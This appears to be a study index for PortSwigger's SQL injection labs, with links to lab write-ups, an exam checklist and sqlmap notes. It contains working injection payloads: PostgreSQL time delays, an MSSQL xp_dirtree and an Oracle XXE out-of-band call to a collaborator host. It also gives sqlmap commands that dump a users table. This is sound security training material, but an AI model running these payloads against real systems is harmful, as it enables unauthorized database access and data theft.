# [SQL injection](https://portswigger.net/web-security/sql-injection)

## Lab

- apprentice:
  - [1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./lab/1.%20SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data.md)
    - postgresql (based on time delay)
  - [2. SQL injection vulnerability allowing login bypass](./lab/2.%20SQL%20injection%20vulnerability%20allowing%20login%20bypass.md)
    - postgresql (based on time delay)
- practitioner:
  - [3. SQL injection UNION attack, determining the number of columns returned by the query](./lab/3.%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query.md)
    - postgresql (based on time delay)
  - [4. SQL injection UNION attack, finding a column containing text](./lab/4.%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text.md)
    - postgresql (based on time delay)
  - [5. SQL injection UNION attack, retrieving data from other tables](./lab/5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables.md)
    - postgresql (based on time delay)
  - [6. SQL injection UNION attack, retrieving multiple values in a single column](./lab/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column.md)
    - postgresql (based on time delay)
  - [7. SQL injection attack, querying the database type and version on Oracle](./lab/7.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle.md)
    - oracle (require FROM dual)
  - [8. SQL injection attack, querying the database type and version on MySQL and Microsoft](./lab/8.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft.md)
    - mssql (require space after double dash)
  - [9. SQL injection attack, listing the database contents on non-Oracle databases](./lab/9.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md)
    - postgresql (based on time delay)
  - [10. SQL injection attack, listing the database contents on Oracle](./lab/10.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle.md)
    - oracle (require FROM dual)
  - [11. Blind SQL injection with conditional responses](./lab/11.%20Blind%20SQL%20injection%20with%20conditional%20responses.md)
    - postgresql (based on time delay)
  - [12. Blind SQL injection with conditional errors](./lab/12.%20Blind%20SQL%20injection%20with%20conditional%20errors.md)
    - oracle
  - [13. Blind SQL injection with time delays](./lab/13.%20Blind%20SQL%20injection%20with%20time%20delays.md)
    - postgresql (based on time delay)
  - [14. Blind SQL injection with time delays and information retrieval](./lab/14.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md)
  - [15. Blind SQL injection with out-of-band interaction](./lab/15.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction.md)
    - oracle (oob interaction)
  - [16. Blind SQL injection with out-of-band data exfiltration](./lab/16.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md)
  - [17. SQL injection with filter bypass via XML encoding](./lab/17.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding.md)

## Preparation for exam

[cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

detect:

- burp scanner
- sqlmap
- manual

  - determine version
  - blind or not
  - find number of columns return by query
  - check columns data type

  - if blind
    - time delay check
    - time delay data retrieval
    - conditional response: compare reponse
    - conditional error: compare status code
    - oob interaction
    - oob data exfiltration

## Version detection

server synchronous (time delay):

- mssql:
- mysql:
- postgresql:

  ```sql
  '||pg_sleep(10)--
  ```

  ```sql
  ';SELECT NULL from pg_sleep(10)--
  ```

- oracle:

server asynchronous (out of band):

- mssql (maybe)

  ```sql
  ';exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'-- 
  ```

- mysql
- postgresql

- oracle:

  ```sql
  'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator/">+%25remote%3b]>'),'/l')+FROM+dual--;
  ```

## sqlmap

technique:

- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

phase:

- sqlmap -r ~/Desktop/test-sqlmap -batch
- sqlmap -r ~/Desktop/test-sqlmap -batch -dbs
- sqlmap -r ~/Desktop/test-sqlmap -batch -D public --tables
- sqlmap -r ~/Desktop/test-sqlmap -batch -D public -T users -dump

successed: lab [5](./lab/5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables.md), [6](./lab/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column.md), [9](./lab/9.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md), [10](./lab/10.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle.md), [11](./lab/11.%20Blind%20SQL%20injection%20with%20conditional%20responses.md), [14](./lab/14.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md)

- synchronous, time-delays

failed: lab [12](./lab/12.%20Blind%20SQL%20injection%20with%20conditional%20errors.md), [15](./lab/15.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction.md), [16](./lab/16.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md), [17](./lab/16.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md)

- asynchronous, oob (maybe portswigger labs only), tamper

## References

[cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
